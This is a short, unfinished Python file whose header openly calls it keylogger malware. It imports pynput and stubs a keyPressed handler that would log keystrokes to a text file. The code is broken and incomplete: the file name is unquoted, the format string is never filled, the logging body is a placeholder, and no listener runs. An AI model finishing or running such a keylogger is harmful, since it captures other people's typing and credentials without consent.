#---------------------------------------------------------
# File: keylogger.py
# Author(s): Alyssa Chiego
# Purpose: malware that tracks and logs keboard input
# Audit: 07.24.24 AC // 07.25.24 AC
#---------------------------------------------------------


from pynput import keyboard

# prints typed key in terminal & creates .txt file
def keyPressed(key):
    # {0} refers to (key)
    print("{0} pressed")
    # use 'a' bc we need to create new file if not exist already
    #   & we need file open for writing
    with open(keylogger.txt, 'a') as keyLog:
        try:
            print("Code Here")
        except:
             print("ERROR")

# need a keyReleased() func??



#---------------------------------------------------------
#Sources:
#  https://pynput.readthedocs.io/en/latest/keyboard.html
#  https://pypi.org/project/pynput/
#  https://stackoverflow.com/questions/1466000/difference-between-modes-a-a-w-w-and-r-in-built-in-open-function
#  https://www.geeksforgeeks.org/how-to-use-pynput-to-make-a-keylogger/
#---------------------------------------------------------
